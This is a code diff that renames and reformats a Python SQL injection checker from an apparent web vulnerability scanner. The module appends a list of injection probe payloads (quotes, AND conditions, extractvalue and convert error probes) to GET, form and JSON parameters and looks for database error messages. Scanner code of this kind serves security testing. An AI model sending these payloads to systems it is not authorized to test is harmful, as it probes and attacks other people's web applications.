@@ -7,34 +7,72 @@ import requests
 from lib.settings import vuln_level
 
 
-class SQLI:
+class SQLIErrorCheck:
     def __init__(self):
         self.num = random_num(4)
         self.s = random_str(4)
         self._payloads = [
-            '鎈\'"\(',
-            "'", "')", "';", '"', '")', '";', ' order By 500 ', "--", "-0",
-            ") AND {}={} AND ({}={}".format(self.num, self.num + 1, self.num, self.num),
-            " AND {}={}%23".format(self.num, self.num + 1),
-            " %' AND {}={} AND '%'='".format(self.num, self.num + 1), " ') AND {}={} AND ('{}'='{}".format(self.num, self.num + 1, self.s, self.s),
-            " ' AND {}={} AND '{}'='{}".format(self.num, self.num + 1, self.s, self.s),
-            '`', '`)',
-            '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C",
+            '鎈\'"\\(',
+            "'",
+            "')",
+            "';",
+            '"',
+            '")',
+            '";',
+            ' order By 500 ',
+            "--",
+            "-0",
+            ") AND {}={} AND ({}={}".format(
+                self.num,
+                self.num + 1,
+                self.num,
+                self.num),
+            " AND {}={}%23".format(
+                self.num,
+                self.num + 1),
+            " %' AND {}={} AND '%'='".format(
+                self.num,
+                self.num + 1),
+            " ') AND {}={} AND ('{}'='{}".format(
+                self.num,
+                self.num + 1,
+                self.s,
+                self.s),
+            " ' AND {}={} AND '{}'='{}".format(
+                self.num,
+                self.num + 1,
+                self.s,
+                self.s),
+            '`',
+            '`)',
+            '`;',
+            '\\',
+            "%27",
+            "%%2727",
+            "%25%27",
+            "%60",
+            "%5C",
             "extractvalue(1,concat(char(126),md5({})))".format(random_num),
-            "convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{}')))".format(random_num)
-        ]
+            "convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{}')))".format(random_num)]
+
     def check_get_error_sqli(self, request):
         url = request.url
         dict = parse.parse_qs(parse.urlparse(url).query)
         for key, value in dict.items():
             if len(value) == 1:
                 for payload in self._payloads:
-                    url1 = get_replaced_url(url, dict[key][0], dict[key][0]+payload)
+                    url1 = get_replaced_url(
+                        url, dict[key][0], dict[key][0] + payload)
                     html = requests.get(url1, headers=request.headers).text
                     res = sensitive_page_error_message_check(html)
                     if len(res) == 1:
-                        print("database: "+res[0]['type']+"\nerror message: "+res[0]['text'])
-                        vuln_print(url1, "sqli", vuln_level["sqli"], request.method)
+                        print(
+                            "database: " +
+                            res[0]['type'] +
+                            "\nerror message: " +
+                            res[0]['text'])
+                        vuln_print(
+                            url1, "sqli", vuln_level["sqli"], request.method)
                         break
 
     def check_post_urlencode_error_sqli(self, request):
@@ -45,12 +83,22 @@ class SQLI:
         for key, value in dict.items():
             if len(value) == 1:
                 for payload in self._payloads:
-                    dict[key][0] = dict[key][0]+payload
-                    html = requests.post(url, data=dict, headers=request.headers).text
+                    dict[key][0] = dict[key][0] + payload
+                    html = requests.post(
+                        url, data=dict, headers=request.headers).text
                     res = sensitive_page_error_message_check(html)
                     if len(res) == 1:
-                        print("database: " + res[0]['type'] + "\nerror message: " + res[0]['text'])
-                        vuln_print(url, "sqli", vuln_level["sqli"], request.method, str(dict))
+                        print(
+                            "database: " +
+                            res[0]['type'] +
+                            "\nerror message: " +
+                            res[0]['text'])
+                        vuln_print(
+                            url,
+                            "sqli",
+                            vuln_level["sqli"],
+                            request.method,
+                            str(dict))
                         break
 
     def check_post_json_error_sqli(self, request):
@@ -60,12 +108,22 @@ class SQLI:
         for key, value in dict.items():
             if type(value).__name__ == "str":
                 for payload in self._payloads:
-                    dict[key] = dict[key]+payload
-                    html = requests.post(url, data=json.dumps(dict), headers=request.headers).text
+                    dict[key] = dict[key] + payload
+                    html = requests.post(
+                        url, data=json.dumps(dict), headers=request.headers).text
                     res = sensitive_page_error_message_check(html)
                     if len(res) == 1:
-                        print("database: " + res[0]['type'] + "\nerror message: " + res[0]['text'])
-                        vuln_print(url, "sqli", vuln_level["sqli"], request.method, body)
+                        print(
+                            "database: " +
+                            res[0]['type'] +
+                            "\nerror message: " +
+                            res[0]['text'])
+                        vuln_print(
+                            url,
+                            "sqli",
+                            vuln_level["sqli"],
+                            request.method,
+                            body)
                         break
 
 # if __name__ == "__main__":
